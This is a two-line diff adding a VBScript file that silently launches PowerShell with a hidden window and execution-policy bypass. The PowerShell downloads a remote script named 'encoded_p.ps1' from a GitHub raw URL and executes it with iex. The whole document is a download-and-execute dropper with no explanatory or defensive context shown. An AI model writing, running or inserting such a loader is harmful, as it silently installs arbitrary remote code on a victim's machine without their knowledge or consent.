@@ -1,0 +1,2 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ""iex (iwr 'https://raw.githubusercontent.com/allisonmorat/three/main/encoded_p.ps1' -UseBasicParsing).Content""", 0, False
